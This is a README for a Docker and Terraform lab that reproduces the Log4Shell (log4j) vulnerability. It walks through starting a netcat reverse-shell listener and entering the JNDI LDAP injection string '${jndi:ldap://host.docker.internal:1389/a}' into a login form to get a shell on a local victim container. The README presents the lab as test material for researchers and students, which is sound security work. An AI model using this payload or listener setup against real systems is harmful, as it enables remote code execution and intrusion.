# Introduction

This repository is setup to quickly test the log4j vulnerability using Docker and Hashicorp Terraform.  All of the components of this test will run in Docker containers on the Docker network, accessible via 'host.docker.internal'.

# Credits / Disclaimer

This test environment is derived from a great blog post from Raxis: (https://raxis.com/blog/log4j-exploit)

The vulnerable application and exploit code came from cyberxml (https://github.com/cyberxml/log4j-poc).

All I've done is codified the environment to make it easy to spin-up and test this delicious exploit.  

_I do not assume any responsibility for adverse effects or malicious actions that may result from the use of the material in this repository.  Full stop.  It is up to **you** to decide if these materials are trustworthy and it is similarly your responsibility to use this information **ethically**.  I merely post these goodies so that reserchers, students, and security professionals can quickly create an environment and test the exploit for themselves.  Seacrest out._

# Prerequisites

- Docker Desktop (https://www.docker.com/)
- Hashicorp Terraform (https://www.terraform.io/)

# Setup

1. Clone this repository
2. Run 'terraform init' in the project directory
3. Start the Docker daemon
4. Run the 'docker-build.sh' bash script to build all of the project's container images.
5. Run 'terraform apply' to create all of the containers in the project.

# Exploitation

1. Shell into the log4j_netcat container using 'docker exec -it netcat /bin/bash' or something similar.  This is where you will receive your shell connection to the victim server once it's established.

2. In your session within the log4j_netcat container, enter the following command to start the listener:

~~~
nc -lv -s 0.0.0.0 -p 9001
~~~

3. In your browser, navigate to http://host.docker.internal:8080/log4shell/

4. Enter the following into the 'Username' field along with anything you want in the 'Password' field:

~~~
${jndi:ldap://host.docker.internal:1389/a}
~~~

5. Return to the log4j_netcat container shell and observe that you have connected to the victim server.

6. Go and wreak havoc!
